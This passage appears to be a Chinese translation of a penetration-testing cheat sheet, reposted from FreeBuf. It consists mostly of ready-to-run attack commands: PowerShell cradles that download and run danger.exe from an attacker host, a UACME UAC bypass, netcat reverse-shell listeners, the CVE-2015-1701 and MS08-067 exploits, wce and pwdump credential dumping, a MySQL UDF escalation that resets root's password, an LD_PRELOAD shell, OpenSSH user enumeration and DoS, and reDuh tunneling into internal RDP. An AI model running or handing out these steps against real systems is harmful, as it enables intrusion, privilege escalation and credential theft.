echo $client.DownloadFile($targetlocation,"danger.exe") >> script2.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1

# 使用预编译的二进制文件绕过 UAC:

https://github.com/hfiref0x/UACME

# 使用 powershell 脚本上传 https://github.com/hfiref0x/UACME/blob/master/Compiled/Akagi64.exe 到目标机器
echo $client = New-Object System.Net.WebClient > script2.ps1
echo $targetlocation = "http://192.168.56.102/Akagi64.exe" >> script3.ps1
echo $client.DownloadFile($targetlocation,"Akagi64.exe") >> script3.ps1
powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script3.ps1

# 在 Kali 上创建监听
nc -lvp 4444

# 以系统权限使用 Akagi64 运行 danger.exe 
Akagi64.exe 1 C:\Users\User\Desktop\danger.exe

# 在 Kali 上创建监听
nc -lvp 4444

# 下一步就会反弹给我们一个提过权的 shell
# 以系统权限使用 PsExec 运行 danger.exe 
psexec.exe –i –d –accepteula –s danger.exe
 

以普通用户身份在 Win7 上反弹具有系统权限的 Shell

https://technet.microsoft.com/en-us/security/bulletin/dn602597.aspx #ms15-051

https://www.fireeye.com/blog/threat-research/2015/04/probable_apt28_useo.html


https://www.exploit-db.com/exploits/37049/

# 查找目标机器是否安装了补丁，输入如下命令
wmic qfe get
wmic qfe | find "3057191"

# 上传编译后的利用程序并运行它

https://github.com/hfiref0x/CVE-2015-1701/raw/master/Compiled/Taihou64.exe

# 默认情况下其会以系统权限执行 cmd.exe，但我们需要改变源代码以运行我们上传的 danger.exe
# https://github.com/hfiref0x/CVE-2015-1701 下载它并定位到 "main.c"

# 使用 wce.exe 获取已登录用户的明文账号密码

http://www.ampliasecurity.com/research/windows-credentials-editor/

wce -w

# 使用 pwdump7 获取其他用户的密码哈希值

http://www.heise.de/download/pwdump.html

# we can try online hash cracking tools such crackstation.net
 

MS08-067 – 不使用 Metasploit

$ nmap -v -p 139, 445 --script=smb-check-vulns --script-args=unsafe=1 192.168.31.205
$ searchsploit ms08-067
$ python /usr/share/exploitdb/platforms/windows/remote/7132.py 192.168.31.205 1
 

通过 MySQL Root 账户实现提权

# Mysql Server version: 5.5.44-0ubuntu0.14.04.1 (Ubuntu)
$ wget 0xdeadbeef.info/exploits/raptor_udf2.c
$ gcc -g -c raptor_udf2.c
$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
mysql -u root -p
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/home/user/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
mysql> select do_system('echo "root:passwd" | chpasswd > /tmp/out; chown user:user /tmp/out');

user:~$ su -
Password:
user:~# whoami
root
root:~# id
uid=0(root) gid=0(root) groups=0(root)
 

使用 LD_PRELOAD 注入程序

$ wget https://github.com/jivoi/pentest/ldpreload_shell.c
$ gcc -shared -fPIC ldpreload_shell.c -o ldpreload_shell.so
$ sudo -u user LD_PRELOAD=/tmp/ldpreload_shell.so /usr/local/bin/somesoft
 

针对 OpenSSH 用户进行枚举时序攻击

注：枚举时序攻击(“Enumeration Timing Attack”)属于侧信道攻击/旁路攻击(Side Channel Attack)，侧信道攻击是指利用信道外的信息，比如加解密的速度/加解密时芯片引脚的电压/密文传输的流量和途径等进行攻击的方式，一个词形容就是“旁敲侧击”。–参考自 shotgun 在知乎上的解释。

osueta 是一个用于对 OpenSSH 进行时序攻击的 python2 脚本，其可以利用时序攻击枚举 OpenSSH 用户名，并在一定条件下可以对 OpenSSH 服务器进行 DOS 攻击。

# https://github.com/c0r3dump3d/osueta
$ ./osueta.py -H 192.168.1.6 -p 22 -U root -d 30 -v yes
$ ./osueta.py -H 192.168.10.22 -p 22 -d 15 -v yes –dos no -L userfile.txt
 

使用 ReDuh 构造合法的 HTTP 请求以建立 TCP 通道

注： ReDuh 是一个通过 HTTP 协议建立隧道传输各种其他数据的工具。其可以把内网服务器的端口通过 http/https 隧道转发到本机，形成一个连通回路。用于目标服务器在内网或做了端口策略的情况下连接目标服务器内部开放端口。

对了亲～ReDuh-Gui 号称端口转发神器哦。

# https://github.com/sensepost/reDuh

# 步骤 1
# 上传 reDuh.jsp 目标服务器
$ http://192.168.10.50/uploads/reDuh.jsp

# 步骤 2
# 在本机运行 reDuhClient 
$ java -jar reDuhClient.jar http://192.168.10.50/uploads/reDuh.jsp

# 步骤 3
# 使用 nc 连接管理端口
$ nc -nvv 127.0.0.1 1010

# 步骤 4
# 使用隧道转发本地端口到远程目标端口
[createTunnel] 7777:172.16.0.4:3389

# 步骤 5
# 使用 RDP 连接远程
$ /usr/bin/rdesktop -g 1024x768 -P -z -x l -k en-us -r sound:off localhost:7777
 

*原文：jivoi，FB小编xiaix编译，转自FreeBuf黑客与极客（FreeBuf.COM）

文章链接：http://www.freebuf.com/sectool/105524.html 

```
